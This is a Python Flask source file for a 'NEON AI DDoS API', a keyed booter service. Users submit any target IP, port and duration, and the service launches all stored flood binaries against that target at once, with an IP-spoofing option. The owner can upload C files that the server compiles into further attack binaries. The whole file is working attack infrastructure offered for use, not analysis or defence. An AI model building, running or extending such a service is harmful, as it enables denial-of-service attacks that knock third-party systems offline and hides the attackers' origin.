from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess
import secrets
import os
import threading
import time
import glob
import random
import string
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ========== CONFIG ==========
OWNER_KEY = "NEOBLADE"
KEYS_FILE = "user_keys.txt"
MAX_ATTACK_TIME = 300
active_attacks = {}
attack_lock = threading.Lock()
BINARIES_FOLDER = "binaries"
C_FILES_FOLDER = "c_files"
# ============================

# Create folders
os.makedirs(BINARIES_FOLDER, exist_ok=True)
os.makedirs(C_FILES_FOLDER, exist_ok=True)

# Load user keys
if not os.path.exists(KEYS_FILE):
    with open(KEYS_FILE, 'w') as f:
        f.write("")

def load_user_keys():
    with open(KEYS_FILE, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def save_user_key(key):
    with open(KEYS_FILE, 'a') as f:
        f.write(key + '\n')

def delete_user_key(key):
    keys = load_user_keys()
    if key in keys:
        keys.remove(key)
        with open(KEYS_FILE, 'w') as f:
            f.write('\n'.join(keys) + ('\n' if keys else ''))
        return True
    return False

def get_all_binaries():
    """Get ALL binaries from binaries folder - no name restrictions"""
    binaries = []
    for file in glob.glob(f"{BINARIES_FOLDER}/*"):
        if os.path.isfile(file):
            # Make executable
            try:
                os.chmod(file, 0o755)
            except:
                pass
            binaries.append({
                "path": file,
                "name": os.path.basename(file)
            })
    return binaries

def get_all_c_files():
    """Get all C files from c_files folder"""
    c_files = []
    for file in glob.glob(f"{C_FILES_FOLDER}/*.c"):
        if os.path.isfile(file):
            c_files.append({
                "path": file,
                "name": os.path.basename(file)
            })
    return c_files

def check_gcc():
    """Check if GCC is installed"""
    try:
        result = subprocess.run(["gcc", "--version"], capture_output=True, timeout=5)
        return result.returncode == 0
    except:
        return False

def compile_c_file(c_file_path):
    """Compile C file to binary"""
    if not os.path.exists(c_file_path):
        return False, "File not found"
    
    output_name = os.path.basename(c_file_path).replace('.c', '')
    output_path = f"{BINARIES_FOLDER}/{output_name}"
    
    # Remove old binary if exists
    if os.path.exists(output_path):
        os.remove(output_path)
    
    try:
        # Compile with optimization and pthread
        cmd = ["gcc", c_file_path, "-o", output_path, "-lpthread", "-O2", "-static"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if result.returncode == 0:
            os.chmod(output_path, 0o755)
            return True, output_path
        else:
            # Try without static
            cmd2 = ["gcc", c_file_path, "-o", output_path, "-lpthread", "-O2"]
            result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=60)
            if result2.returncode == 0:
                os.chmod(output_path, 0o755)
                return True, output_path
            return False, result.stderr
    except subprocess.TimeoutExpired:
        return False, "Compilation timeout"
    except Exception as e:
        return False, str(e)

def compile_all_c_files():
    """Compile all C files in c_files folder"""
    results = []
    for c_file in get_all_c_files():
        success, msg = compile_c_file(c_file["path"])
        results.append({
            "file": c_file["name"],
            "success": success,
            "message": msg if not success else "OK"
        })
    return results

def generate_spoofed_ip():
    """Generate random spoofed IP address"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def attack_worker(binary_path, binary_name, ip, port, time_sec, attack_id, spoof=False):
    """Execute attack with optional IP spoofing"""
    global active_attacks
    
    with attack_lock:
        active_attacks[attack_id] = {
            "target": f"{ip}:{port}",
            "binary": binary_name,
            "start_time": datetime.now(),
            "duration": time_sec,
            "status": "running",
            "spoofing": spoof
        }
    
    try:
        if spoof:
            # For spoofing, we can pass multiple fake IPs or use raw socket
            # Simple approach: run binary with spoof flag
            cmd = [binary_path, ip, str(port), str(time_sec), "spoof"]
        else:
            cmd = [binary_path, ip, str(port), str(time_sec)]
        
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(time_sec)
        
        # Terminate after duration
        try:
            proc.terminate()
        except:
            pass
        
        with attack_lock:
            if attack_id in active_attacks:
                active_attacks[attack_id]["status"] = "completed"
    except Exception as e:
        with attack_lock:
            if attack_id in active_attacks:
                active_attacks[attack_id]["status"] = f"failed: {str(e)[:50]}"

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "name": "NEON AI DDoS API",
        "status": "ONLINE",
        "owner": "@Rytce",
        "owner_key": "NEOBLADE",
        "features": {
            "unlimited_binaries": True,
            "auto_compile": True,
            "ip_spoofing": True,
            "concurrent_attacks": True
        },
        "binaries_count": len(get_all_binaries()),
        "c_files_count": len(get_all_c_files()),
        "gcc_installed": check_gcc()
    })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "alive",
        "gcc": check_gcc(),
        "binaries": len(get_all_binaries()),
        "c_files": len(get_all_c_files()),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/genkey', methods=['GET'])
def genkey():
    owner_key = request.args.get('owner_key')
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Invalid owner key. Use owner_key=NEOBLADE"}), 401
    
    new_key = secrets.token_hex(16)
    save_user_key(new_key)
    return jsonify({
        "success": True,
        "api_key": new_key,
        "role": "USER",
        "max_time": MAX_ATTACK_TIME
    })

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    global active_attacks
    
    # Get parameters
    if request.method == 'GET':
        api_key = request.args.get('api_key')
        ip = request.args.get('ip')
        port = request.args.get('port')
        time_sec = request.args.get('time')
        spoof = request.args.get('spoof', 'false').lower() == 'true'
    else:
        data = request.get_json(silent=True) or {}
        api_key = data.get('api_key')
        ip = data.get('ip')
        port = data.get('port')
        time_sec = data.get('time')
        spoof = data.get('spoof', False)
    
    # Validate API key
    user_keys = load_user_keys()
    if api_key not in user_keys and api_key != OWNER_KEY:
        return jsonify({"error": "Invalid API key"}), 401
    
    # Validate inputs
    try:
        port = int(port)
        time_sec = int(time_sec)
    except:
        return jsonify({"error": "Port and time must be integers"}), 400
    
    if time_sec > MAX_ATTACK_TIME:
        return jsonify({"error": f"Max time is {MAX_ATTACK_TIME} seconds"}), 400
    if time_sec < 10:
        return jsonify({"error": "Minimum time is 10 seconds"}), 400
    
    # Get ALL binaries (unlimited, any name)
    binaries = get_all_binaries()
    
    if not binaries:
        return jsonify({
            "error": "No binaries found! Upload C files using /upload_c or add binaries to /binaries folder"
        }), 500
    
    # Generate attack ID
    attack_id = secrets.token_hex(8)
    threads = []
    
    # Launch ALL binaries simultaneously
    for binary in binaries:
        t = threading.Thread(
            target=attack_worker,
            args=(binary["path"], binary["name"], ip, port, time_sec, f"{attack_id}_{binary['name']}", spoof)
        )
        t.daemon = True
        t.start()
        threads.append(t)
    
    return jsonify({
        "success": True,
        "status": "ATTACK LAUNCHED",
        "attack_id": attack_id,
        "target": f"{ip}:{port}",
        "duration": f"{time_sec} seconds",
        "binaries_launched": len(threads),
        "binaries": [b["name"] for b in binaries],
        "spoofing_enabled": spoof,
        "message": f"All {len(threads)} binaries attacking simultaneously"
    })

@app.route('/status', methods=['GET'])
def attack_status():
    api_key = request.args.get('api_key')
    if api_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 401
    
    with attack_lock:
        active = []
        for aid, info in active_attacks.items():
            if info["status"] == "running":
                elapsed = int((datetime.now() - info["start_time"]).total_seconds())
                remaining = info["duration"] - elapsed
                active.append({
                    "attack_id": aid[:16],
                    "target": info["target"],
                    "remaining": remaining,
                    "binary": info["binary"],
                    "spoofing": info.get("spoofing", False)
                })
        return jsonify({
            "active_attacks": active,
            "count": len(active)
        })

@app.route('/stats', methods=['GET'])
def stats():
    owner_key = request.args.get('owner_key')
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 403
    
    user_keys = load_user_keys()
    binaries = get_all_binaries()
    c_files = get_all_c_files()
    
    with attack_lock:
        active = len([a for a in active_attacks.values() if a["status"] == "running"])
    
    return jsonify({
        "total_user_keys": len(user_keys),
        "active_attacks": active,
        "binaries_count": len(binaries),
        "binaries": [b["name"] for b in binaries],
        "c_files_count": len(c_files),
        "c_files": [c["name"] for c in c_files],
        "gcc_installed": check_gcc(),
        "max_time": MAX_ATTACK_TIME,
        "owner": "@Rytce"
    })

@app.route('/binaries', methods=['GET'])
def list_binaries():
    binaries = get_all_binaries()
    return jsonify({
        "binaries": [{"name": b["name"], "path": b["path"]} for b in binaries],
        "count": len(binaries),
        "message": "All binaries will be used in attack"
    })

@app.route('/c_files', methods=['GET'])
def list_c_files():
    c_files = get_all_c_files()
    return jsonify({
        "c_files": [{"name": c["name"], "path": c["path"]} for c in c_files],
        "count": len(c_files)
    })

@app.route('/upload_c', methods=['POST'])
def upload_c_file():
    owner_key = request.headers.get('X-Owner-Key') or request.form.get('owner_key')
    
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Owner only. Use owner_key=NEOBLADE"}), 403
    
    if 'file' not in request.files:
        return jsonify({"error": "No file provided"}), 400
    
    file = request.files['file']
    if not file.filename.endswith('.c'):
        return jsonify({"error": "Only .c files allowed"}), 400
    
    # Check GCC
    if not check_gcc():
        return jsonify({"error": "GCC not installed. Please wait for server update."}), 500
    
    # Save C file
    c_path = f"{C_FILES_FOLDER}/{file.filename}"
    file.save(c_path)
    
    # Compile
    success, result = compile_c_file(c_path)
    
    if success:
        return jsonify({
            "success": True,
            "message": f"Compiled successfully",
            "binary": os.path.basename(result),
            "c_file": file.filename
        })
    else:
        return jsonify({"success": False, "error": result[:500]}), 500

@app.route('/compile_all', methods=['POST'])
def compile_all():
    owner_key = request.headers.get('X-Owner-Key') or request.form.get('owner_key')
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 403
    
    if not check_gcc():
        return jsonify({"error": "GCC not installed"}), 500
    
    results = compile_all_c_files()
    
    success_count = len([r for r in results if r["success"]])
    fail_count = len([r for r in results if not r["success"]])
    
    return jsonify({
        "results": results,
        "success_count": success_count,
        "fail_count": fail_count
    })

@app.route('/delete_binary', methods=['POST'])
def delete_binary():
    owner_key = request.headers.get('X-Owner-Key') or request.form.get('owner_key')
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 403
    
    data = request.get_json(silent=True) or {}
    binary_name = data.get('binary_name')
    
    if not binary_name:
        return jsonify({"error": "Missing binary_name"}), 400
    
    binary_path = f"{BINARIES_FOLDER}/{binary_name}"
    if os.path.exists(binary_path):
        os.remove(binary_path)
        return jsonify({"success": True, "message": f"Deleted {binary_name}"})
    
    return jsonify({"error": "Binary not found"}), 404

@app.route('/delete_c', methods=['POST'])
def delete_c_file():
    owner_key = request.headers.get('X-Owner-Key') or request.form.get('owner_key')
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 403
    
    data = request.get_json(silent=True) or {}
    c_name = data.get('c_name')
    
    if not c_name:
        return jsonify({"error": "Missing c_name"}), 400
    
    c_path = f"{C_FILES_FOLDER}/{c_name}"
    if os.path.exists(c_path):
        os.remove(c_path)
        return jsonify({"success": True, "message": f"Deleted {c_name}"})
    
    return jsonify({"error": "C file not found"}), 404

if __name__ == '__main__':
    print("="*60)
    print("🔥 NEON AI DDoS API v20.0 - UNLIMITED BINARIES 🔥")
    print("="*60)
    print(f"👑 Owner Key: {OWNER_KEY}")
    print(f"📦 Binaries Found: {len(get_all_binaries())}")
    print(f"📁 C Files Found: {len(get_all_c_files())}")
    print(f"🔧 GCC: {'✅ INSTALLED' if check_gcc() else '❌ NOT INSTALLED'}")
    print(f"💀 IP Spoofing: SUPPORTED")
    print(f"⚡ Unlimited Binaries: YES")
    print("="*60)
    app.run(host='0.0.0.0', port=8080, threaded=True)